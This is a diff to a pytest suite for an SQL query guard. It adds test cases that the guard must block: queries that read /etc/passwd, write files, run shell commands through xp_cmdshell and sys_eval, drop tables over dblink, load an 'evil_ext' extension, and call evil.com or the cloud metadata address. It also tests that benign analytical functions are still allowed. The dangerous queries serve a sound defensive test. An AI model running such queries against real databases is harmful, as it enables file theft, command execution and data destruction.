@@ -320,6 +320,47 @@ def test_query_locking_reads_blocked(locking_sql: str):
         "SELECT pg_cancel_backend(12345)",
         "SELECT pg_reload_conf()",
         "SELECT waitfor('00:00:05')",
+        # PostgreSQL 文件与目录读取 (CWE-200)
+        "SELECT pg_read_file('/etc/passwd')",
+        "SELECT pg_read_binary_file('/etc/passwd')",
+        "SELECT pg_ls_dir('/tmp')",
+        "SELECT pg_ls_waldir()",
+        "SELECT pg_ls_logdir()",
+        "SELECT pg_stat_file('/etc/passwd')",
+        "SELECT pg_catalog.pg_read_file('/etc/passwd')",
+        # PostgreSQL 大对象持久写入 (CWE-863)
+        "SELECT lo_import('/etc/hostname')",
+        "SELECT lo_export(1, '/tmp/x')",
+        "SELECT lo_put(1, 0, 'data')",
+        "SELECT lo_unlink(1)",
+        "SELECT lo_create(0)",
+        # 远程执行与跨库链接
+        "SELECT dblink_exec('conn', 'DROP TABLE victim')",
+        "SELECT * FROM dblink('conn', 'SELECT 1') AS t(a int)",
+        # MySQL / MariaDB 文件与命令执行
+        "SELECT LOAD_FILE('/etc/passwd')",
+        "SELECT sys_eval('whoami')",
+        "SELECT sys_exec('whoami')",
+        "SELECT do_system('whoami')",
+        # SQLite 动态扩展加载
+        "SELECT load_extension('evil_ext')",
+        # SQL Server 进程派生与跨库探查
+        "SELECT xp_cmdshell('whoami')",
+        "SELECT sys.xp_cmdshell('whoami')",
+        "SELECT xp_dirtree('C:\\')",
+        "SELECT * FROM OPENROWSET('provider', 'conn', 'query')",
+        "SELECT * FROM OPENQUERY(linked_server, 'query')",
+        # Oracle / 达梦 高危包调用
+        "SELECT utl_file.get_line(f, b) FROM dual",
+        "SELECT sys.utl_file.get_line(f, b) FROM dual",
+        "SELECT utl_http.request('http://evil.com') FROM dual",
+        "SELECT dbms_lob.loadfromfile(a, b, c) FROM dual",
+        "SELECT dbms_scheduler.create_job() FROM dual",
+        # ClickHouse 表函数穿透
+        "SELECT * FROM file('/etc/passwd', 'CSV')",
+        "SELECT * FROM url('http://169.254.169.254', 'CSV')",
+        "SELECT * FROM remote('127.0.0.1', 'db', 'tbl')",
+        "SELECT * FROM s3('http://s3.amazonaws.com', 'CSV')",
     ],
 )
 def test_query_dangerous_functions_blocked(dangerous_func_sql: str):
@@ -327,6 +368,37 @@ def test_query_dangerous_functions_blocked(dangerous_func_sql: str):
     with pytest.raises(SecurityViolationError) as exc_info:
         ASTGuard.validate_and_rewrite_query(dangerous_func_sql)
     assert "高危" in str(exc_info.value) or "副作用" in str(exc_info.value)
+
+
+@pytest.mark.parametrize(
+    "benign_sql",
+    [
+        "SELECT id, name, upper(name), lower(name) FROM users",
+        "SELECT abs(score), round(val, 2), count(*), sum(amount) FROM metrics GROUP BY id",
+        "SELECT ST_Distance(loc1, loc2) FROM geospatial_table",
+        "SELECT json_extract(meta, '$.status') FROM records",
+        "SELECT row_number() OVER (PARTITION BY dept ORDER BY salary DESC) FROM emp",
+    ],
+)
+def test_benign_analytical_functions_allowed(benign_sql: str):
+    """验证普通分析型函数、数学函数、字符串函数与 PostGIS 空间函数零误杀正常放行."""
+    rewritten = ASTGuard.validate_and_rewrite_query(benign_sql, limit=100)
+    assert "LIMIT 100" in rewritten
+
+
+def test_strict_functions_mode():
+    """验证开启 strict_functions=True 时，仅放行纯计算白名单函数，拦截未知/自定义函数."""
+    # 纯函数放行
+    pure_sql = "SELECT abs(score), lower(name), count(*) FROM users"
+    safe = ASTGuard.validate_and_rewrite_query(pure_sql, strict_functions=True)
+    assert "LIMIT" in safe
+
+    # 未在白名单中的自定义或未知函数拦截
+    with pytest.raises(SecurityViolationError) as exc_info:
+        ASTGuard.validate_and_rewrite_query(
+            "SELECT custom_analytics_fn(id) FROM users", strict_functions=True
+        )
+    assert "严格函数模式" in str(exc_info.value) and "custom_analytics_fn" in str(exc_info.value)
 
 
 def test_dml_merge_allowed_with_valid_on():
